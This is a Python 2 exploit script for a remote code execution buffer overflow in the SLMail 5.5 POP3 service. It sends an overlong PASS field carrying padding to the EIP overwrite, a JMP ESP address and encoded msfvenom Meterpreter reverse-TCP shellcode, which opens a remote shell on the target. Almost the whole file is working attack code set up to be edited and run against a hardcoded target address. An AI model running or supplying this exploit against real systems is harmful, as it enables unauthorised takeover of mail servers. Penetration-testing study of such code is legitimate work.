#!/usr/bin/python

# Sill being built ( multi OS not yet working - so ignore usage, simply edit the target info in script and run)

#####################################################################################
#______________________________SLMAIL 5.5 RCE Exploit________________________________
#__                                                                                __
#                      Author: WillChaos
#                      Usage: ./SLMailExploit.sh <ip> <port> <ID>
#
#                      ID's:
#                      [1] > win 7   | x86 | english
#                      [2] > win xp  | x86 | english
#                      [3] > win 2k3 | x86 | english
#--                                                                                 --
######################################################################################




# imports
import socket

# adjustable vars - victim/target info
addr_ip='192.168.10.26'
addr_port=110

# leave this as user
uname='USER'

# JMPS ESP located under: slmfc.dll - 0x5f4a358f : '\xff\xe4'
jmpesp="\x8f\x35\x4a\x5f"

# msfvenom -p windows/meterpreter/reverse_tcp LHOST=$x.x.x.x LPORT=7777 -f c -e x86/shikata_ga_nai -b \x00\x0a\x0d exitfunc=process                                                                                                          # offset: 2606 is EIP overwrite
# payload                                                                                                 # bad chars - \x00\x0a\x0d
totalBytes=2700                                                                                           # total bytes we can work with
headPadding="A" * 2606                                                                                    # padding before EIP overwrite
OVERWRITE=jmpesp                                                                                          # JMP ESP code (jump to our shell)
shellCode=(
"\xb8\xf9\xa2\x0e\xa5\xdb\xca\xd9\x74\x24\xf4\x5d\x29\xc9\xb1"
"\x56\x83\xed\xfc\x31\x45\x0f\x03\x45\xf6\x40\xfb\x59\xe0\x07"
"\x04\xa2\xf0\x67\x8c\x47\xc1\xa7\xea\x0c\x71\x18\x78\x40\x7d"
"\xd3\x2c\x71\xf6\x91\xf8\x76\xbf\x1c\xdf\xb9\x40\x0c\x23\xdb"
"\xc2\x4f\x70\x3b\xfb\x9f\x85\x3a\x3c\xfd\x64\x6e\x95\x89\xdb"
"\x9f\x92\xc4\xe7\x14\xe8\xc9\x6f\xc8\xb8\xe8\x5e\x5f\xb3\xb2"
"\x40\x61\x10\xcf\xc8\x79\x75\xea\x83\xf2\x4d\x80\x15\xd3\x9c"
"\x69\xb9\x1a\x11\x98\xc3\x5b\x95\x43\xb6\x95\xe6\xfe\xc1\x61"
"\x95\x24\x47\x72\x3d\xae\xff\x5e\xbc\x63\x99\x15\xb2\xc8\xed"
"\x72\xd6\xcf\x22\x09\xe2\x44\xc5\xde\x63\x1e\xe2\xfa\x28\xc4"
"\x8b\x5b\x94\xab\xb4\xbc\x77\x13\x11\xb6\x95\x40\x28\x95\xf1"
"\xa5\x01\x26\x01\xa2\x12\x55\x33\x6d\x89\xf1\x7f\xe6\x17\x05"
"\xf6\xe0\xa7\xd9\xb0\x61\x56\xda\xc0\xa8\x9d\x8e\x90\xc2\x34"
"\xaf\x7b\x13\xb8\x7a\x11\x19\x2e\x45\x4d\x17\xb2\x2d\x8f\x28"
"\xd4\xcc\x06\xce\xb8\x5e\x48\x5f\x79\x0f\x28\x0f\x11\x45\xa7"
"\x70\x01\x66\x62\x19\xa8\x89\xda\x71\x45\x33\x47\x09\xf4\xbc"
"\x52\x77\x36\x36\x56\x87\xf9\xbf\x13\x9b\xee\xa7\xdb\x63\xef"
"\x4d\xdb\x09\xeb\xc7\x8c\xa5\xf1\x3e\xfa\x69\x09\x15\x79\x6d"
"\xf5\xe8\x4b\x05\xc0\x7e\xf3\x71\x2d\x6f\xf3\x81\x7b\xe5\xf3"
"\xe9\xdb\x5d\xa0\x0c\x24\x48\xd5\x9c\xb1\x73\x8f\x71\x11\x1c"
"\x2d\xaf\x55\x83\xce\x9a\xe5\xc4\x30\x58\xc2\x6c\x58\xa2\x52"
"\x8d\x98\xc8\x52\xdd\xf0\x07\x7c\xd2\x30\xe7\x57\xbb\x58\x62"
"\x36\x09\xf9\x73\x13\xcf\xa7\x74\x90\xd4\x58\x0e\xd9\xeb\x99"
"\xef\xf3\x8f\x9a\xef\xfb\xb1\xa7\x39\xc2\xc7\xe6\xf9\x71\xd7"
"\x5d\x5f\xd3\x72\x9d\xf3\x23\x57"
)
nops="\x90" * 16                                                                                           # Shellcode is dynamic here (but you are limited to X bytes)
espTailPadding= "C" * (totalBytes - len(headPadding) - len(OVERWRITE) - len(shellCode))                    # pads the rest of the payload to complete any leftover bytes if any

# final payload
payload=headPadding + OVERWRITE + nops + shellCode +  espTailPadding

print "--------------------------------------------------------------------------------------------------------"

# print confif info
print "_______________________________________INFO_&_CONFIG____________________________________________________"
print "Payload byte length constraints: 2700"
print "EIP overwrite located:           %s" % len(headPadding)
print "JMP>ESP overwrite selected:      %s" % OVERWRITE
print "ESPTail Padding length:          %s" % len(espTailPadding)
print "Shell size:                      %s" % len(shellCode)
print "Total payload size:              %s" % len(payload)
print "Scipt Author:                    WillChaos                                                                 "
print "________________________________________________________________________________________________________"
print "________________________________________________________________________________________________________"
# connect sock
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=s.connect((addr_ip, addr_port))
print "[*] Opened new connection to: %s" % str(addr_ip)

# recv init banner
banner = s.recv(1024)
print "[RCV] Recieved connection banner: %s" % str(banner)

# send username
print "[SEND] Sending username: %s" % str(uname)
s.send('USER ' + uname + '\r\n') 

# recv uname response
resp = s.recv(1024)
print "[RCV] Recieved response: %s" % str(resp)

# send password + payload
print "[SEND] sending PASS + payload length: %s " % len(payload)
s.send('PASS ' + payload + '\r\n')

# recive response from pass + payload
resp2 = s.recv(1024)
print  "[RCV] Recieved reponse: %s" % str(resp2)

s.send('QUIT\r\n')

print "--------------------------------------------------------------------------------------------------------"


s.close()
